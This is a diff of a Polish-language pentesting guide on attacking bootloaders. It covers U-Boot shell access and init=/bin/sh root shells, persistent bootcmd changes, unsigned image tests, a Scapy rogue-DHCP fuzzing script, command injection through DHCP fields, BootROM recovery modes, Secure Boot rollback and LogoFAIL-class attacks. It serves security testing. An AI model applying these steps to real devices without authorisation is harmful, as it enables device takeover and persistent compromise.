@@ -1,23 +1,29 @@
-# Bootloader Testing
+# Testowanie bootloadera
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Poniższe kroki są zalecane do modyfikowania konfiguracji startu urządzenia i testowania bootloaderów takich jak U-Boot i UEFI-class loaders. Skoncentruj się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisów/rollback oraz nadużyciach ścieżek recovery lub network-boot.
+Poniższe kroki są zalecane do modyfikowania konfiguracji startowych urządzenia i testowania bootloaderów takich jak U-Boot i ładowarki klasy UEFI. Skoncentruj się na uzyskaniu wczesnego wykonywania kodu, ocenie ochrony podpisów/rollback oraz nadużyciu ścieżek recovery lub netboot.
 
-## U-Boot — szybkie triki i nadużywanie środowiska
+Related: MediaTek secure-boot bypass via bl2_ext patching:
 
-1. Dostęp do interpretera (shell)
-- Podczas bootu naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki "magiczna" sekwencja) przed wykonaniem `bootcmd`, aby dostać się do promptu U-Boot.
+{{#ref}}
+android-mediatek-secure-boot-bl2_ext-bypass-el3.md
+{{#endref}}
 
-2. Sprawdź stan bootu i zmienne
+## U-Boot quick wins and environment abuse
+
+1. Access the interpreter shell
+- Podczas rozruchu naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki „magiczna” sekwencja) przed wykonaniem `bootcmd`, aby dostać się do promptu U-Boot.
+
+2. Inspect boot state and variables
 - Przydatne polecenia:
-- `printenv` (zrzut environment)
-- `bdinfo` (info o płytce, adresy pamięci)
+- `printenv` (zrzut środowiska)
+- `bdinfo` (informacje o płytce, adresy pamięci)
 - `help bootm; help booti; help bootz` (obsługiwane metody bootowania kernela)
 - `help ext4load; help fatload; help tftpboot` (dostępne loadery)
 
-3. Modyfikacja argumentów bootu, by uzyskać root shell
-- Dopisz `init=/bin/sh`, aby kernel zamiast normalnego init uruchomił shell:
+3. Modify boot arguments to get a root shell
+- Dopisz `init=/bin/sh`, aby kernel uruchomił shell zamiast normalnego init:
 ```
 # printenv
 # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
@@ -25,7 +31,7 @@ Poniższe kroki są zalecane do modyfikowania konfiguracji startu urządzenia i 
 # boot    # or: run bootcmd
 ```
 
-4. Netboot z twojego serwera TFTP
+4. Netboot from your TFTP server
 - Skonfiguruj sieć i pobierz kernel/fit image z LAN:
 ```
 # setenv ipaddr 192.168.2.2      # device IP
@@ -38,19 +44,19 @@ Poniższe kroki są zalecane do modyfikowania konfiguracji startu urządzenia i 
 # booti ${loadaddr} - ${fdt_addr_r}
 ```
 
-5. Utrwalanie zmian przez environment
-- Jeśli pamięć env nie jest write-protected, można utrwalić kontrolę:
+5. Persist changes via environment
+- Jeśli przechowywanie env nie jest write-protected, możesz upersistować kontrolę:
 ```
 # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
 # saveenv
 ```
-- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki fallback. Nieprawidłowe wartości mogą dawać powtarzalne przerwania do shella.
+- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki fallback. Niewłaściwe wartości mogą umożliwić wielokrotne przerwania do shella.
 
-6. Sprawdź debug/unsafe funkcje
-- Szukaj: `bootdelay` > 0, wyłączone `autoboot`, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z niezaufanych nośników oraz kerneli/ramdisków ładowanych bez sprawdzenia podpisu.
+6. Check debug/unsafe features
+- Szukaj: `bootdelay` > 0, `autoboot` wyłączone, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z niezaufanych mediów oraz kerneli/ramdisków ładowanych bez sprawdzania podpisów.
 
-7. Testowanie weryfikacji obrazów U-Boot
-- Jeśli platforma deklaruje secure/verified boot z obrazami FIT, spróbuj zarówno unsigned, jak i zmodyfikowanych obrazów:
+7. U-Boot image/verification testing
+- Jeśli platforma twierdzi, że ma secure/verified boot z FIT images, spróbuj zarówno unsigned jak i zmodyfikowanych obrazów:
 ```
 # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
 # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
@@ -58,11 +64,11 @@ Poniższe kroki są zalecane do modyfikowania konfiguracji startu urządzenia i 
 ```
 - Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub legacy zachowanie `verify=n` często pozwala na bootowanie dowolnych payloadów.
 
-## Powierzchnia network-boot (DHCP/PXE) i rogue serwery
+## Network-boot surface (DHCP/PXE) and rogue servers
 
-8. Fuzzing parametrów PXE/DHCP
-- Legacy obsługa BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje memory disclosure przez spreparowane odpowiedzi DHCP, które mogą leakować bajty z pamięci U-Boot z powrotem na sieć. Testuj ścieżki DHCP/PXE używając nadmiernie długich/granicznych wartości (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszenia/leaki.
-- Minimalny snippet Scapy do obciążania parametrów boot podczas netboot:
+8. PXE/DHCP parameter fuzzing
+- Legacy BOOTP/DHCP w U-Boot miało problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci przez przygotowane odpowiedzi DHCP, które mogą leak bajty z pamięci U-Boot z powrotem na sieć. Przetestuj ścieżki DHCP/PXE z nadmiernie długimi/krawędziowymi wartościami (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszania/leaki.
+- Minimalny snippet Scapy do obciążenia parametrów boot podczas netboot:
 ```python
 from scapy.all import *
 offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
@@ -77,45 +83,45 @@ DHCP(options=[('message-type','offer'),
 'end']))
 sendp(offer, iface='eth0', loop=1, inter=0.2)
 ```
-- Zweryfikuj także, czy pola nazwy pliku PXE są przekazywane do logiki shell/loader bez sanitizacji, zwłaszcza gdy są łańcuchowane do skryptów provisioning po stronie OS.
+- Zweryfikuj również, czy pola nazwy pliku PXE są przekazywane do logiki shell/loader bez sanitacji, gdy są łańcuchowane do skryptów provisioning po stronie OS.
 
-9. Rogue DHCP — testy command injection
-- Skonfiguruj rogue DHCP/PXE service i spróbuj wstrzykiwać znaki do pól filename lub options, aby dotrzeć do interpreterów poleceń w późniejszych etapach łańcucha boot. Metasploit’s DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy sprawdzą się dobrze. Najpierw odizoluj sieć laboratoryjną.
+9. Rogue DHCP server command injection testing
+- Uruchom złośliwy serwis DHCP/PXE i spróbuj wstrzyknąć znaki do pól filename lub options, aby trafić do interpreterów poleceń w późniejszych etapach łańcucha boot. Narzędzia takie jak Metasploit’s DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy sprawdzają się dobrze. Najpierw odizoluj sieć laboratoryjną.
 
-## Tryby recovery BootROM SoC, które nadpisują normalny boot
+## SoC ROM recovery modes that override normal boot
 
-Wiele SoC udostępnia BootROM "loader" mode, który przyjmuje kod przez USB/UART nawet jeśli obrazy w flash są niepoprawne. Jeśli secure-boot fuses nie są przepalone, daje to wczesne, arbitralne wykonanie kodu bardzo wcześnie w łańcuchu.
+Wiele SoC udostępnia BootROM "loader" mode, który zaakceptuje kod przez USB/UART nawet gdy obrazy w flash są nieprawidłowe. Jeśli secure-boot fuse/OTP nie są zablokowane, może to zapewnić arbitralne wykonywanie kodu bardzo wcześnie w łańcuchu.
 
 - NXP i.MX (Serial Download Mode)
-- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
-- Przykład: `imx-usb-loader u-boot.imx` do wgrania i uruchomienia custom U-Boot z RAM.
+- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
+- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
 - Allwinner (FEL)
-- Narzędzie: `sunxi-fel`.
-- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
+- Tool: `sunxi-fel`.
+- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
 - Rockchip (MaskROM)
-- Narzędzie: `rkdeveloptool`.
-- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` do przygotowania loadera i wgrania custom U-Boot.
+- Tool: `rkdeveloptool`.
+- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.
 
-Oceń, czy urządzenie ma przetopione eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często pomijają wyższe poziomy weryfikacji (U-Boot, kernel, rootfs) przez wykonanie twojego first-stage payload bezpośrednio z SRAM/DRAM.
+Oceń, czy urządzenie ma wypalone eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często obejdą wyższe poziomy weryfikacji (U-Boot, kernel, rootfs) poprzez wykonanie twojego first-stage payloadu bezpośrednio z SRAM/DRAM.
 
-## UEFI/PC-class bootloaders: szybkie kontrole
+## UEFI/PC-class bootloaders: quick checks
 
-10. Modyfikacja ESP i testy rollback
-- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki logo vendorów.
-- Spróbuj bootować z downgraded lub znanymi-wulnerable signed komponentami boot jeśli revokacje Secure Boot (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP, aby uzyskać trwałość.
+10. ESP tampering and rollback testing
+- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki logotypów vendorów.
+- Spróbuj bootować z przywróconymi lub znanymi podatnymi, podpisanymi komponentami boot, jeśli Secure Boot revocations (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często możesz załadować swój kernel lub `grub.cfg` z ESP, aby uzyskać persistence.
 
-11. Błędy parsowania logo (klasa LogoFAIL)
-- Kilka firmware OEM/IBV było podatnych na błędy parsowania obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w vendor-specyficznym path (np. `\EFI\<vendor>\logo\*.bmp`) i rebootować, możliwe jest wykonanie kodu podczas wczesnego boot nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczone przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.
+11. Boot logo parsing bugs (LogoFAIL class)
+- Kilku OEM/IBV firmware było podatnych na błędy parsowania obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce specyficznej dla vendor (np. `\EFI\<vendor>\logo\*.bmp`) i zrestartować, możliwe jest wykonanie kodu w early boot nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje obrazy dostarczone przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.
 
-## Ostrzeżenia dotyczące hardware
+## Hardware caution
 
-Zachowaj ostrożność przy interakcji z SPI/NAND flash podczas wczesnego boot (np. uziemianie pinów by pominąć odczyty) i zawsze konsultuj datasheet flash. Źle czasowane zwarcia mogą uszkodzić urządzenie lub programator.
+Zachowaj ostrożność przy interakcji z SPI/NAND flash podczas wczesnego bootu (np. uziemianie pinów, aby obejść odczyty) i zawsze konsultuj się z datasheetem flasha. Nieprawidłowo wykonane zwarcia mogą uszkodzić urządzenie lub programator.
 
-## Notatki i dodatkowe wskazówki
+## Notes and additional tips
 
-- Spróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}` aby przenosić bloby environment między RAM a storage; niektóre platformy pozwalają importować env z wymiennych mediów bez uwierzytelnienia.
-- Dla trwałości na systemach Linux bootujących przez `extlinux.conf`, modyfikacja linii `APPEND` (w celu wstrzyknięcia `init=/bin/sh` lub `rd.break`) często wystarcza, gdy nie ma wymuszonych sprawdzeń podpisów.
-- Jeśli userland udostępnia `fw_printenv/fw_setenv`, zweryfikuj, że `/etc/fw_env.config` odpowiada faktycznemu storage env. Nieprawidłowe offsety pozwalają czytać/pisać niewłaściwy region MTD.
+- Spróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenieść blob środowiska między RAM a storage; niektóre platformy pozwalają importować env z wymiennych mediów bez uwierzytelnienia.
+- Dla persistence na systemach Linux, które bootują przez `extlinux.conf`, modyfikacja linii `APPEND` (w celu wstrzyknięcia `init=/bin/sh` lub `rd.break`) na partycji boot często wystarcza, gdy nie ma wymuszonych checków podpisów.
+- Jeśli userland udostępnia `fw_printenv/fw_setenv`, zweryfikuj że `/etc/fw_env.config` odpowiada rzeczywistemu magazynowi env. Błędnie skonfigurowane offsety pozwalają czytać/pisać nieprawidłowy region MTD.
 
 ## References
 
